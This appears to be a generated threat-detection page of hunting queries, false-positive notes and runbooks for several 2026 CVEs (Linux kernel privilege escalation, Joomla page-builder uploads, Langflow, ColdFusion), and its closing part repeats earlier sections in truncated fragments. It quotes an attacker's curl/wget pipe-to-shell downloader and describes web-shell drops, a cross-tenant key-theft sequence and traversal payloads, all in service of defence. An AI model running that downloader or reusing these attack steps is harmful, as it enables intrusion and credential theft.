CVEsCVE-2026-43499 CVE-2026-10702 CVE-2026-46242 CVE-2026-31431 CVE-2026-53166

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Host exposure to GhostLock IonStack kernel-to-root chain CVEs (CVE-2026-43499 et al.) · [LLM] Linux unprivileged process escalates to root without sudo/su/pkexec (kernel-LPE / container-escape shape)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
Host exposure to GhostLock IonStack kernel-to-root chain CVEs (CVE-2026-43499 et al.) AIExploitation High
Surfaces every managed asset whose vulnerability inventory reports exposure to the GhostLock/IonStack chain and its sibling 2026 Linux LPE CVEs, so multi-tenant/cloud/CI hosts (where a local foothold is most likely) can be patched first. Article-specific because it keys on the exact CVE identifiers Nebula disclosed and the fix-regression CVE the article warns you must also clear. Rationale: Uses the five concrete CVE IDs named in the article/pre-extracted IOCs (GhostLock CVE-2026-43499, the Firefox first-half CVE-2026-10702, sibling Bad Epoll CVE-2026-46242, KEV-listed Copy Fail CVE-2026-31431, and the fix-regression CVE-2026-53166). TVM inventory match is deterministic; corroborated fixed-kernel version (Linux 7.1) confirms which builds clear it. Cross-checked against: • https://nebusec.ai/research/ionstack-part-2/ • https://securityonline.info/ghostlock-cve-2026-43499/ • https://nvd.nist.gov/vuln/detail/CVE-2026-43499 • https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/
ATT&CKT1068 T1611
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Host already patched to fixed kernel but TVM inventory snapshot is stale (rescan pending)
  • Kernel live-patching (kpatch/ksplice/kernelcare) applied at runtime while the on-disk package version still reads vulnerable
  • Ephemeral CI/build containers flagged that are torn down within minutes and never expose a persistent foothold
  • CVE-2026-10702 reported against Firefox on single-user endpoints that are lower priority than shared/multi-tenant Linux hosts
  • Air-gapped or single-tenant hosts where the 'already logged in' precondition is low-risk
Response runbook
1) Triage: rank hits by exposure — shared/multi-tenant Linux hosts, cloud servers, container hosts and CI runners first (the footholds the article calls out); confirm the running kernel via OSVersion, not just package metadata (live-patch can mask it). 2) Contain: schedule/deploy the current distribution kernel (Linux 7.1+ / vendor-fixed build that also clears the CVE-2026-53166 regression) and reboot; where patching lags, enable RANDOMIZE_KSTACK_OFFSET and STATIC_USERMODE_HELPER as interim hardening. 3) Hunt: on any host that stayed vulnerable and internet-adjacent, run the companion non-root-to-root behavioral hunt and review for post-exploitation persistence (new root cron, added users, SSH authorized_keys).
DeviceTvmSoftwareVulnerabilities
| where CveId in ("CVE-2026-43499","CVE-2026-10702","CVE-2026-46242","CVE-2026-31431","CVE-2026-53166")
| project DeviceName, DeviceId, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| sort by CveId asc, DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in ("CVE-2026-43499","CVE-2026-10702","CVE-2026-46242","CVE-2026-31431","CVE-2026-53166")
| summarize arg_max(TimeGenerated, *) by DeviceId, CveId
| project TimeGenerated, DeviceName, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| sort by CveId asc, DeviceName asc
Linux unprivileged process escalates to root without sudo/su/pkexec (kernel-LPE / container-escape shape) AIExploitation Medium
Hunts the article's core outcome: a non-root user's process yielding a child running as root without transiting a legitimate setuid escalation helper, the observable signature of a kernel use-after-free exploit like GhostLock that 'enables root and container escape.' Not tied to a phishing/LOLBin template; anchors on the unprivileged-to-root process transition on Linux endpoints. Rationale: Grounded in the article's central, repeatedly-stated claim ('enables root and container escape on most Linux distros' from 'any local program'). The non-root-parent-to-root-child transition without a setuid helper is the observable residue of a kernel UAF LPE; escalation/setuid binaries are excluded to raise fidelity. Datadog left empty because the listed linux.auditd normalized fields do not cleanly expose the euid/auid transition this detection needs. Cross-checked against: • https://nebusec.ai/research/ionstack-part-2/ • https://securityonline.info/ghostlock-cve-2026-43499/ • https://thehackernews.com/2026/05/cisa-adds-actively-exploited-linux-root.html
ATT&CKT1068 T1611
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • User-invoked setuid-root binaries not in the exclusion list (e.g. Xorg, exim, at, dbus helpers, vendor VPN/backup agents) reporting effective root
  • Container runtimes (runc, crun, containerd-shim, docker-init) launching root workloads whose immediate parent is a non-root orchestrator process
  • User crontab entries or systemd user units configured to execute a root helper
  • Interactive 'sudo -i' / policy-kit GUI prompts whose telemetry attributes the child to the invoking user rather than the helper
  • Configuration-management agents (Ansible/Salt/Puppet) escalating via a custom become-method not covered by su/sudo/pkexec
Suppression filter
| where not (ParentProcess in~ ("ansible","salt-minion","puppet","chef-client","dockerd","docker-init","crun") or ChildProcess in~ ("Xorg","exim","at","dbus-daemon-launch-helper","vpnagentd"))
Response runbook
1) Triage: pull the full parent->child tree and both command lines; confirm the child genuinely ran as uid 0 and the parent was an ordinary user process (not a setuid helper), and cross-check whether the host is still exposed to the GhostLock chain via the companion TVM hunt. 2) Contain: isolate the host, capture a memory/disk snapshot before reboot, and terminate the root-context shell/process; rotate any credentials or keys reachable from that host. 3) Hunt: sweep the fleet for the same non-root->root pattern, and on confirmed hosts look for follow-on persistence (new root cron, added /etc/passwd or sudoers entries, injected SSH authorized_keys) and container-escape indicators (containerized PID writing to host mount paths).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName =~ "root"
| where isnotempty(InitiatingProcessAccountName) and InitiatingProcessAccountName !~ "root"
| where InitiatingProcessFileName !in~ ("sudo","su","pkexec","sudoedit","doas","gksudo","gksu","runuser","login","sshd","systemd","init","runc","containerd-shim","crond","cron","polkitd","lightdm","gdm","sddm")
| where FileName !in~ ("sudo","su","pkexec","sudoedit","doas","passwd","chsh","chfn","gpasswd","newgrp","mount","umount","fusermount","fusermount3","ping","ping6","ntfs-3g","pmount","mount.nfs")
| project Timestamp, DeviceName, RanAsUser = AccountName, ParentUser = InitiatingProcessAccountName, ParentProcess = InitiatingProcessFileName, ParentCmd = InitiatingProcessCommandLine, ChildProcess = FileName, ChildCmd = ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where TargetUsername =~ "root"
| where isnotempty(ActorUsername) and ActorUsername !~ "root"
| where not(ActingProcessName has_any ("sudo","su","pkexec","sudoedit","doas","runuser","login","sshd","systemd","runc","containerd-shim","polkitd","crond"))
| where not(TargetProcessName has_any ("sudo","su","pkexec","sudoedit","doas","passwd","chsh","chfn","gpasswd","newgrp","mount","umount","fusermount","ping","ntfs-3g"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
#event_simpleName=ProcessRollup2 UserName=root
| ParentBaseFileName!=/^(sudo|su|pkexec|sudoedit|doas|runuser|login|sshd|systemd|init|runc|containerd-shim.*|cron|crond|polkitd)$/i
| ImageFileName=/\/(bash|dash|sh|zsh|ksh|python[0-9.]*|perl|ruby|ncat|nc|busybox)$/i
| table([_time, aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
ENDPOINT

| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.user="root" Processes.parent_process_name!="sudo" Processes.parent_process_name!="su" Processes.parent_process_name!="pkexec" Processes.parent_process_name!="doas" Processes.parent_process_name!="sudoedit" Processes.parent_process_name!="runuser" Processes.parent_process_name!="login" Processes.parent_process_name!="sshd" Processes.parent_process_name!="systemd" Processes.parent_process_name!="runc" Processes.parent_process_name!="containerd-shim" Processes.process_name!="passwd" Processes.process_name!="mount" Processes.process_name!="umount" Processes.process_name!="fusermount" Processes.process_name!="ping" by Processes.dest Processes.user Processes.parent_process_user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | where parent_process_user!="root" AND isnotnull(parent_process_user) | sort - lastTime

description: |

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities

DeviceTvmSoftwareVulnerabilities

| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-43499", "CVE-2026-10702", "CVE-2026-46242", "CVE-2026-31431", "CVE-2026-53166")

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

SP Page Builder unauthenticated upload via asset.uploadCustomIcon (CVE-2026-48908) AIDelivery High
Hunts unauthenticated HTTP POST requests to the Joomla SP Page Builder asset.uploadCustomIcon task, the exact zero-day vector CISA added to KEV. The endpoint accepts a file with no auth and no type check, letting attackers plant a PHP web shell and a hidden Super Administrator account. Rationale: Uses the article's exact endpoint (option=com_sppagebuilder&task=asset.uploadCustomIcon) plus POST method; mySites.guru confirms this is the sole exploitation vector and that <=6.6.1 is affected (fixed 6.6.2), so any POST to this task on an internet-facing host is high-fidelity. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/ • https://nvd.nist.gov/vuln/detail/CVE-2026-48908 • https://censys.com/advisory/cve-2026-48908/
ATT&CKT1190 T1505.003
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A site administrator legitimately uploading a custom icon font through the SP Page Builder admin UI (would be authenticated and rare)
  • Vulnerability scanners (Nessus/Qualys/Nuclei) probing the endpoint during authorized assessments
  • Web-app pentest engagements replaying the PoC against a staging host
  • Security researchers fingerprinting the component version
Suppression filter
| where scStatus in (200, 302) or isnotempty(cIP)
Response runbook
1) Triage: pull the scStatus for the flagged POST — a 200/302 means the upload likely succeeded; capture cIP and csUserAgent. 2) Contain: block the source IP at the WAF, take the SP Page Builder component offline (note: unpublishing does NOT protect), and confirm the host is upgraded to 6.6.2+. 3) Hunt: search web root for PHP files under /media/com_sppagebuilder/assets/iconfont/*/fonts/ (e.g. codex-sppb-*.php) and enumerate Joomla users for any new Super Administrator with an @secure.local email address.
W3CIISLog
| where TimeGenerated > ago(30d)
| where csMethod == "POST"
| where csUriStem endswith "index.php"
| where csUriQuery has "com_sppagebuilder" and csUriQuery has "asset.uploadCustomIcon"
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
| order by TimeGenerated desc

Joomla Page Builder web shell drop under /media (CVE-2026-56290 / CVE-2026-48908) AIInstallation High
Detects creation of PHP files in Joomla web-served directories by a web-server/PHP process, matching the planted web shells from both KEV Joomla flaws: bhup.php under /media/com_pagebuilderck/gfonts/ (Page Builder CK) and codex-sppb-*.php under /media/com_sppagebuilder/assets/iconfont/*/fonts/ (SP Page Builder). Rationale: Anchors on the exact web shell filename/paths corroborated by mySites.guru (bhup.php keyed on $_POST['_upl'] under /media/com_pagebuilderck/gfonts/; codex-sppb-*.php under /media/com_sppagebuilder/assets/iconfont/*/fonts/) and constrains the writer to web-server/PHP processes — a new .php file written into a font/media asset dir by php-fpm is almost never legitimate. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/ • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Joomla core or extension auto-update writing PHP into /media during an upgrade (would be initiated by the Joomla updater, not a bare php-fpm request)
  • A developer deploying a custom Joomla module or template that legitimately ships PHP in /media
  • Backup/restore tooling repopulating the web root
  • Composer/CLI-driven asset builds run by an admin on the host
Suppression filter
| where InitiatingProcessCommandLine !has "joomlaupdate" and InitiatingProcessCommandLine !has "com_installer"
Response runbook
1) Triage: open the created .php file and inspect for $_POST['_upl'] / file-manager code or eval/system calls; note the InitiatingProcess and the writing account. 2) Contain: quarantine/delete the shell, kill the php-fpm/apache worker if a live handler is attached, and block the uploader IP at the WAF. 3) Hunt: pivot on the same host for a new Joomla Super Administrator (@secure.local email), other stray PHP under /images, /templates, /administrator, and outbound connections initiated by the web process shortly after the drop.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType == "FileCreated"
| where FileName endswith ".php"
| where FolderPath has_any (@"/media/com_pagebuilderck/", @"/media/com_sppagebuilder/assets/iconfont/", @"\\media\\com_pagebuilderck\\", @"\\media\\com_sppagebuilder\\")
    or FileName in~ ("bhup.php") or FileName startswith "codex-sppb-"
| where InitiatingProcessFileName in~ ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType == "FileCreated"
| where TargetFileExtension =~ "php"
| where TargetFilePath has_any ("/media/com_pagebuilderck/", "/media/com_sppagebuilder/assets/iconfont/")
    or TargetFileName in~ ("bhup.php") or TargetFileName startswith "codex-sppb-"
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

Access to planted Joomla Page Builder web shell path AICommand & Control High
Hunts direct HTTP GET/POST access to the known planted web shell URLs from the two Joomla KEV flaws — /media/com_pagebuilderck/gfonts/bhup.php and /media/com_sppagebuilder/assets/iconfont/*/fonts/*.php — which are immediately reachable via direct request after upload. Rationale: The full shell path /media/com_pagebuilderck/gfonts/bhup.php is quoted verbatim by mySites.guru, and the SP Page Builder iconfont/fonts/*.php location is corroborated as the observed drop site — a PHP request into a font-asset folder has no legitimate use, so any hit is actionable. Cross-checked against: • https://mysites.guru/blog/sp-page-builder-zero-day-uploadcustomicon-rce/
ATT&CKT1505.003 T1071.001
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Incident responders or the site owner curling the shell URL to confirm/remediate it (will appear from internal/known IPs)
  • Vulnerability scanners that fingerprint the known IOC path
  • A legitimately named codex-sppb icon font PHP shipped by a benign third-party template (rare; verify contents)
  • Uptime/monitoring tools crawling every path under /media

| where cIP != "127.0.0.1" and cIP !startswith "::1"
Response runbook
1) Triage: check scStatus and csMethod — a 200 with POST body indicates interactive shell use; capture cIP and csUserAgent to distinguish responder from attacker. 2) Contain: delete the shell file, block the accessing IP, and rotate any credentials/config the web app could read. 3) Hunt: correlate the accessing IP against the upload event (asset.uploadCustomIcon POST), review commands the web process ran after each shell hit, and check for a new Super Administrator account.

Langflow cross-tenant IDOR credential theft chain (CVE-2026-55255) AIActions on Objectives High
Hunts the Sysdig-documented Langflow attack sequence: GET /api/v1/flows/ to enumerate other tenants' flow IDs, followed by POST /api/v1/responses replaying those IDs as the model parameter with input designed to leak provider secrets — the CVE-2026-55255 cross-tenant IDOR used to steal LLM and AWS keys. Rationale: Sysdig details the fixed-order playbook (auto_login -> GET /api/v1/flows/ to harvest IDs -> POST /api/v1/responses with input 'leak api keys'). Correlating the flow-enumeration GET with a same-source /responses POST within a short window captures the IDOR abuse while filtering benign single-endpoint traffic; time-window correlation is why this isn't emitted as Sigma. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited • https://github.com/advisories/GHSA-qrpv-q767-xqq2
ATT&CKT1190 T1552.001 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • A legitimate Langflow power user listing their own flows then running one via the API in quick succession
  • Automated CI/CD or SDK integrations that call /api/v1/flows/ then /api/v1/responses as normal workflow
  • Langflow health-check or synthetic monitoring hitting both endpoints
  • Internal QA scripts exercising the flow-execution API
Suppression filter
| where cIP != "" and scStatus < 400
Response runbook
1) Triage: confirm the /responses POST references a flow ID that does NOT belong to the requesting session's tenant (cross-tenant IDOR) and check the source IP against 45.207.216.55. 2) Contain: block the source IP, upgrade Langflow past the patched release, and rotate ALL provider secrets stored in flows (LLM API keys, AWS keys). 3) Hunt: pivot to the same IP for CVE-2026-33017 RCE follow-on (see the /tmp/lang_pwn and slt downloader UC) and audit AWS CloudTrail for use of any leaked keys.
let win = 10m;
let flows = W3CIISLog
    | where TimeGenerated > ago(30d)
    | where csMethod == "GET" and csUriStem endswith "/api/v1/flows/"
    | project FlowTime = TimeGenerated, Computer, cIP;
W3CIISLog
| where TimeGenerated > ago(30d)
| where csMethod == "POST" and csUriStem endswith "/api/v1/responses"
| join kind=inner flows on cIP
| where TimeGenerated between (FlowTime .. FlowTime + win)
| project TimeGenerated, FlowTime, DelaySec = datetime_diff('second', TimeGenerated, FlowTime), Computer, cIP, csUriStem, scStatus, csUserAgent
| order by TimeGenerated desc

| tstats summariesonly=false count values(Web.http_method) as methods dc(Web.url) as url_count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.url="*/api/v1/flows/*" OR Web.url="*/api/v1/responses*") by Web.src, Web.dest | `drop_dm_object_name(Web)` | where url_count>=2 | sort - lastTime
Langflow RCE second-stage downloader curl/wget to 45.207.216.55:8084/slt (CVE-2026-33017) AIInstallation Medium
Detects the CVE-2026-33017 RCE payload observed by Sysdig: a Langflow custom component that shells out to '(curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt) | sh', dropping a /tmp/lang_pwn marker and pulling a second-stage botnet/cryptojacking payload from the operator host. Rationale: The download one-liner (curl -fsSL http://45.207.216.55:8084/slt || wget -q http://45.207.216.55:8084/slt | sh) and the /tmp/lang_pwn marker come directly from Sysdig's payload analysis; the operator IP 45.207.216.55 is in the article's IOC list, making both the command string and the network destination hard IOCs. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1059.004 T1105 T1071.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A responder intentionally curling the IOC URL from a sandbox to retrieve the sample (will be a known analyst host)
  • Threat-intel enrichment tooling fetching the payload for detonation
  • Almost none otherwise — 45.207.216.55 and /tmp/lang_pwn are attacker-specific
Suppression filter
| where InitiatingProcessCommandLine !has "sandbox" and AccountName !in~ ("threatanalyst")
Response runbook
1) Triage: confirm the parent of curl/wget is a Langflow/python process and whether the pipe-to-sh succeeded; check for /tmp/lang_pwn on disk. 2) Contain: isolate the host, kill the second-stage process and any spawned miner/bot, and block 45.207.216.55 egress network-wide. 3) Hunt: enumerate cron/systemd persistence added by the payload, look for other hosts contacting 45.207.216.55:8084, and confirm whether the preceding IDOR (CVE-2026-55255) leaked cloud keys that now need rotation.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("curl","wget","sh","bash","dash")
| where ProcessCommandLine has "45.207.216.55" and ProcessCommandLine has "slt"
    or ProcessCommandLine has "/tmp/lang_pwn"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
Syslog
| where TimeGenerated > ago(30d)
| where ProcessName in~ ("curl","wget","sh","bash","dash") or SyslogMessage has_any ("curl","wget")
| where SyslogMessage has "45.207.216.55" and SyslogMessage has "slt"
    or SyslogMessage has "/tmp/lang_pwn"
| project TimeGenerated, Computer, HostIP, ProcessName, SyslogMessage
| order by TimeGenerated desc

Langflow C2 egress to operator host 45.207.216.55 AICommand & Control Medium
Network-layer companion detection for the Langflow campaign: any outbound connection to the operator host 45.207.216.55 (observed on port 8084 serving /slt). Catches the RCE downloader and subsequent second-stage C2 even when command-line telemetry is unavailable. Rationale: 45.207.216.55 is the operator IP named in both the article IOC list and Sysdig's write-up (serving the /slt second stage on :8084); a hard IP IOC makes any egress to it high-confidence with near-zero benign traffic. Cross-checked against: • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1071.001 T1105
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Threat-intel / sandbox infrastructure deliberately connecting to the IOC for detonation
  • A security proxy pre-fetching the URL for URL-reputation scanning
  • Essentially no legitimate business traffic to this host
Response runbook
1) Triage: identify the initiating process on the connecting host — a Langflow/python or curl/wget parent confirms the RCE chain. 2) Contain: block 45.207.216.55 at the perimeter, isolate the host, and snapshot for forensics. 3) Hunt: sweep all hosts for prior connections to 45.207.216.55, look for /tmp/lang_pwn and injected Langflow custom components, and rotate any cloud/LLM keys exposed via the paired IDOR.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "45.207.216.55"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessAccountName
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where DstIpAddr == "45.207.216.55"
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, DvcHostname, NetworkApplicationProtocol, Url
| order by TimeGenerated desc

Adobe ColdFusion path traversal exploitation (CVE-2026-48282) AIExploitation Medium
Hunts web requests exhibiting the CVE-2026-48282 Adobe ColdFusion path-traversal exploitation — directory-traversal encodings in the URI/query and/or requests from the confirmed exploitation source 103.207.14.220 (India), which was observed attacking within hours of disclosure. Rationale: Combines the article's confirmed first-observed exploitation IP (103.207.14.220, provided by KEVIntel) with canonical path-traversal encodings for the CVE-2026-48282 (path traversal -> code execution) class; the IP is a hard IOC while the traversal patterns catch other actors reusing the same primitive. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://nvd.nist.gov/vuln/detail/CVE-2026-48282
ATT&CKT1190 T1083
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate application URLs containing encoded '..' sequences in benign parameters (rare but possible in some frameworks)
  • Web vulnerability scanners generating traversal payloads during authorized scans
  • Security proxies that URL-encode paths in ways that trip the encoded-dot patterns
  • A CDN or WAF appliance rewriting URLs with encoded segments
Suppression filter
| where scStatus in (200, 500) or cIP == "103.207.14.220"
Response runbook
1) Triage: for the flagged request, decode csUriQuery and confirm the traversal targets a sensitive path; check scStatus for success (200) vs blocked (403). 2) Contain: block the source IP (103.207.14.220 and any repeat offenders), apply the Adobe ColdFusion patch, and restrict the ColdFusion admin surface. 3) Hunt: look for post-exploit ColdFusion (jrun/coldfusion/cfexec) process spawning cmd.exe/powershell.exe, new files written to the CFIDE/web root, and outbound connections from the ColdFusion service account.
W3CIISLog
| where TimeGenerated > ago(30d)
| where cIP == "103.207.14.220"
    or csUriStem has_any ("..%2f","..%5c","%2e%2e%2f","%2e%2e%5c")
    or csUriQuery has_any ("..%2f","..%5c","%2e%2e%2f","%2e%2e%5c","../../")
    or csUriStem contains "../../"
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent
| order by TimeGenerated desc

Web-application process spawning a shell (post-exploitation of ColdFusion/Joomla/Langflow) AIExploitation Medium
Detects web-application server processes — ColdFusion (coldfusion/jrun/java), Joomla PHP handlers (php/php-fpm/apache), and Langflow (python/uvicorn) — spawning an interactive shell or LOLBin, the common post-exploitation step after the four KEV flaws in this article are triggered. Rationale: Grounds a classic web-shell/RCE follow-on pivot in the specific server stacks named in the article (Adobe ColdFusion, Joomla/PHP, Langflow/Python); pairing each web-app parent with a shell/LOLBin child is the highest-signal way to catch execution across all four flaws without an app-specific string. Cross-checked against: • https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html • https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
ATT&CKT1190 T1059 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • PHP/Python apps that legitimately shell out (e.g. ImageMagick/ffmpeg wrappers, backup scripts, cron-triggered maintenance)
  • Langflow itself spawning python subprocesses for custom components (baseline the normal children)
  • Deployment/CI agents running under the web-app service account
  • Monitoring agents invoking curl/id/whoami for health checks
Suppression filter
| where ProcessCommandLine !has "healthcheck" and ProcessCommandLine !has "/usr/lib/" and AccountName !endswith "$"
Response runbook
1) Triage: inspect the child command line — recon (whoami/id), a download (curl/wget to an external IP), or an interactive shell all indicate hands-on-keyboard or scripted RCE. 2) Contain: isolate the host, kill the child chain, and block any external IP it contacted (e.g. 45.207.216.55). 3) Hunt: correlate with the preceding web-log exploit event (uploadCustomIcon POST, /api/v1/responses, or ColdFusion traversal), search for dropped web shells/persistence, and rotate credentials the web-app service account could reach.
DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion.exe","jrun.exe","java","python","python3","uvicorn")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh","bash","sh","dash","whoami","id","curl","wget","certutil.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(14d)
| where ParentProcessName has_any ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion","jrun","java","python","uvicorn")
| where TargetProcessName has_any ("cmd.exe","powershell.exe","pwsh","/bash","/sh","/dash","whoami","curl","wget","certutil.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

status: experimental
description: |

    non-browser process touching these files is a high-fidelity signal.
references:

Ransomware-style mass file rename / extension change Actions on Objectives Medium

ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")

| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host

| summarize files = dcount(TargetFileName)

| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"

| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code.
